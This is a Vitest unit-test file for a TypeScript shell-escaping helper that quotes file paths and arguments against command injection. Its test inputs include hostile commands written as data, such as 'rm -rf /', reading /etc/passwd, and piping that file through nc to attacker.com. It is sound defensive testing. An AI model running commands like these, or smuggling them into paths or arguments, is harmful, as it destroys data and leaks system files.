import { describe, it, expect } from "vitest";
import { shellEscape, shellEscapeArgs } from "./shellEscape";

describe("shellEscape", () => {
  it("should escape simple strings", () => {
    expect(shellEscape("file.txt")).toBe("'file.txt'");
    expect(shellEscape("/path/to/file")).toBe("'/path/to/file'");
  });

  it("should escape strings with spaces", () => {
    expect(shellEscape("file name.txt")).toBe("'file name.txt'");
    expect(shellEscape("/path with spaces/file")).toBe(
      "'/path with spaces/file'",
    );
  });

  it("should escape strings with single quotes", () => {
    expect(shellEscape("file'name.txt")).toBe("'file'\\''name.txt'");
    expect(shellEscape("path'with'quotes")).toBe("'path'\\''with'\\''quotes'");
  });

  it("should escape shell metacharacters to prevent injection", () => {
    // Semicolon - command separator
    expect(shellEscape("file; rm -rf /")).toBe("'file; rm -rf /'");

    // Pipe - command chaining
    expect(shellEscape("file | cat")).toBe("'file | cat'");

    // Ampersand - background execution
    expect(shellEscape("file & echo done")).toBe("'file & echo done'");

    // Dollar sign - variable expansion
    expect(shellEscape("file$HOME")).toBe("'file$HOME'");

    // Backtick - command substitution
    expect(shellEscape("file`whoami`")).toBe("'file`whoami`'");

    // Parentheses - command grouping
    expect(shellEscape("file(test)")).toBe("'file(test)'");

    // Redirection
    expect(shellEscape("file > output")).toBe("'file > output'");
    expect(shellEscape("file < input")).toBe("'file < input'");

    // Multiple metacharacters
    expect(shellEscape("file; rm -rf / | cat &")).toBe(
      "'file; rm -rf / | cat &'",
    );
  });

  it("should escape empty string", () => {
    expect(shellEscape("")).toBe("''");
  });

  it("should handle complex injection attempts", () => {
    const maliciousPaths = [
      "/tmp/test; rm -rf /",
      "/tmp/test | cat /etc/passwd",
      "/tmp/test && echo pwned",
      "/tmp/test || echo pwned",
      "/tmp/test`id`",
      "/tmp/test$(whoami)",
      "/tmp/test; cat /etc/passwd | nc attacker.com 1234",
    ];

    for (const path of maliciousPaths) {
      const escaped = shellEscape(path);
      // All should be wrapped in single quotes
      expect(escaped).toMatch(/^'.*'$/);
      // The original content should be preserved (not executed)
      expect(escaped).toContain(path);
    }
  });
});

describe("shellEscapeArgs", () => {
  it("should escape and join multiple arguments", () => {
    expect(shellEscapeArgs(["file1.txt", "file2.txt"])).toBe(
      "'file1.txt' 'file2.txt'",
    );
  });

  it("should handle arguments with spaces", () => {
    expect(shellEscapeArgs(["file name.txt", "another file.txt"])).toBe(
      "'file name.txt' 'another file.txt'",
    );
  });

  it("should handle arguments with metacharacters", () => {
    expect(shellEscapeArgs(["file; rm", "file|cat"])).toBe(
      "'file; rm' 'file|cat'",
    );
  });

  it("should handle empty array", () => {
    expect(shellEscapeArgs([])).toBe("");
  });
});
